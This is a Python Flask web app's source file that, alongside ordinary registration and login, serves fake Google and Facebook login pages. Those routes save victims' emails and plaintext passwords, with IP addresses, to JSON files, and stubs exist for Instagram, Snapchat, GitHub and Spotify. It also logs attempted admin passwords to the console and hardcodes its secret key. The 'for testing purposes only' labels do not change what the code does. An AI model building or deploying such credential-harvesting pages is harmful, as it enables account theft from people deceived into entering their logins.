from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'user_login'

USER_DATA_FILE = 'data/Users/users.json'
ADMIN_DATA_FILE = 'data/Users/admin.json'

# User model
class User(UserMixin):
    def __init__(self, id, name, password, is_admin):
        self.id = id
        self.name = name
        self.password = password
        self.is_admin = is_admin

    def get_id(self):
        return str(self.id)

# Load users from file
def load_users():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    with open(USER_DATA_FILE, 'r') as f:
        return json.load(f)

# Load admins from file
def load_admins():
    if not os.path.exists(ADMIN_DATA_FILE):
        return {}
    with open(ADMIN_DATA_FILE, 'r') as f:
        return json.load(f)

# Save users to file
def save_users(users):
    os.makedirs(os.path.dirname(USER_DATA_FILE), exist_ok=True)
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Flask-Login user loader
@login_manager.user_loader
def load_user(user_id):
    users = load_users()
    if user_id in users:
        u = users[user_id]
        return User(id=user_id, name=u.get('username'), password=u['password'], is_admin=False)

    admins = load_admins()
    if user_id in admins:
        a = admins[user_id]
        return User(id=user_id, name=a.get('username', 'Admin'), password=a['password'], is_admin=True)

    return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')

        users = load_users()
        for user in users.values():
            if user.get('email') == email:
                return 'User already exists with this email'

        user_id = str(len(users) + 1)
        users[user_id] = {
            'username': username,
            'email': email,
            'password': generate_password_hash(password)
        }
        save_users(users)
        return redirect(url_for('user_login'))

    return render_template('register.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        print(f"Attempt admin login with email: {email}, password: {password}")

        admins = load_admins()
        print(f"Loaded admins: {admins}")

        for uid, admin in admins.items():
            print(f"Checking admin: {admin}")
            if admin.get('email') == email:
                print("Email matched")
                if check_password_hash(admin.get('password', ''), password):
                    print("Password matched")
                    login_user(User(id=uid, name=admin.get('username', 'Admin'), password=admin.get('password'), is_admin=True))
                    return redirect(url_for('admin_dashboard'))
                else:
                    print("Password did not match")
        print("Invalid admin credentials")
        return 'Invalid admin credentials'
    return render_template('login/admin_login.html')


@app.route('/user_login', methods=['GET', 'POST'])
def user_login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        users = load_users()
        for uid, user in users.items():
            if user.get('email') == email and check_password_hash(user.get('password', ''), password):
                login_user(User(id=uid, name=user.get('username', 'User'), password=user.get('password'), is_admin=False))
                return redirect(url_for('user_dashboard'))

        return 'Invalid credentials'

    return render_template('login/user_login.html')

@app.route('/user_dashboard')
@login_required
def user_dashboard():
    role = 'User' if current_user.is_admin else 'Admin'
    return render_template('login/dashboard/user_dashboard.html', name=current_user.name, role=role)

@app.route('/admin_dashboard')
@login_required
def admin_dashboard():
    role = 'Admin' if current_user.is_admin else 'User'
    return render_template('login/dashboard/admin_dashboard.html', name=current_user.name, role=role)

# @app.route('/logout')
# @login_required
# def logout():
#     logout_user()
#     return redirect(url_for('login'))


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

def personal():
    if request.method == 'POST':
        name = request.form['name']
        age = request.form['age']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            "timestamp": timestamp,
            "ip": ip,
            "name": name,
            "age": age
        }

        save_to_json('data/personal_data.json', data)
        return 'Personal info saved successfully!'
    return render_template('forms/personal.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        email = request.form['email']
        phone = request.form['phone']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            "timestamp": timestamp,
            "ip": ip,
            "email": email,
            "phone": phone
        }

        save_to_json('data/contact_data.json', data)
        return 'Contact info saved successfully!'
    return render_template('forms/contact.html')
    
@app.route('/google-login', methods=['GET', 'POST'])
def google_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            'email': email,
            'password': password,
            'ip': ip,
            'timestamp': timestamp
        }

        save_to_json('data/google_data.json', data)

        return "Login data saved (for testing purposes only)."
    
    return render_template('idp/google.html')

@app.route('/facebook-login', methods=['GET', 'POST'])
def facebook_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            'email': email,
            'password': password,
            'ip': ip,
            'timestamp': timestamp
        }

        save_to_json('data/facebook_data.json', data)

        return "Facebook login data saved (for testing purposes only)."

    return render_template('idp/facebook.html')

@app.route('/login-options')
@login_required
def login_options():
    return render_template('/options/login_options.html')

@app.route('/camera')
@login_required
def camera():
    return "Camera Access Page (To be developed)"


@app.route('/location')
@login_required
def location():
    return "Location Access Page (To be developed)"

@app.route('/other-options')
@login_required
def other_options():
    return "Other Options Page (To be developed)"

def instagram_login():
    return "Instagram login page (testing purpose)."


@app.route('/snapchat-login', methods=['GET', 'POST'])
def snapchat_login():
    return "Snapchat login page (testing purpose)."

@app.route('/github-login', methods=['GET', 'POST'])
def github_login():
    return "GitHub login page (testing purpose)."

@app.route('/spotify-login', methods=['GET', 'POST'])
def spotify_login():
    return "Spotify login page (testing purpose)."

@app.route('/service/<int:service_id>')
def service_detail(service_id):
    services = {
        1: {
            'title': 'Web Development',
            'price': '$499',
            'description': 'Full-stack web development for your business, including front-end and back-end solutions.',
            'image': 'samurai-sci-fi-city-moon-digital-art-4k-wallpaper-uhdpaper.com-239@0@k.jpg',
            'features': 'Responsive design, Custom CMS, E-commerce integration, etc.'
        },
        2: {
            'title': 'Mobile App Design',
            'price': '$399',
            'description': 'Creative and user-friendly mobile app designs for both Android and iOS.',
            'image': 'road-sunset-car-city-buildings-scenery-digital-art-4k-wallpaper-uhdpaper.com-334@1@m.jpg',
            'features': 'UI/UX design, Cross-platform compatibility, Push notifications, etc.'
        },
        3: {
            'title': 'AI Chatbot Integration',
            'price': '$599',
            'description': 'Integrate AI chatbots for customer support, increasing engagement and efficiency.',
            'image': 'kung-fu-panda-4-po-zhen-4k-wallpaper-uhdpaper.com-452@1@n.jpg',
            'features': 'Natural language processing, 24/7 support, Customizable responses, etc.'
        },
        4: {
            'title': 'SEO Optimization',
            'price': '$299',
            'description': 'Improve your website ranking with comprehensive SEO services.',
            'image': 'japanese-castle-cherry-blossom-mountain-digital-art-scenery-4k-wallpaper-uhdpaper.com-702@1@k.jpg',
            'features': 'Keyword research, On-page SEO, Link building, etc.'
        },
        5: {
            'title': 'Digital Marketing',
            'price': '$449',
            'description': 'Boost your brand visibility through tailored digital marketing campaigns.',
            'image': 'fortnite-she-hulk-thor-storm-iron-man-uhdpaper.com-4K-7.2567.jpg',
            'features': 'Social media campaigns, Google Ads, Analytics tracking, etc.'
        },
        6: {
            'title': 'Cloud Setup (AWS/GCP)',
            'price': '$699',
            'description': 'Cloud infrastructure setup and management for scalable solutions.',
            'image': 'deadpool-marvel-4k-wallpaper-uhdpaper.com-32@5@a.jpg',
            'features': 'Cloud architecture design, Serverless solutions, Database management, etc.'
        }
    }

    service = services.get(service_id)
    if not service:
        return "Service not found", 404
    return render_template('service_detail.html', service=service)


def save_to_json(filename, data):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            existing_data = json.load(f)
    else:
        existing_data = []

    existing_data.append(data)

    with open(filename, 'w') as f:
        json.dump(existing_data, f, indent=4)

if __name__ == '__main__':
    app.run(debug=True)
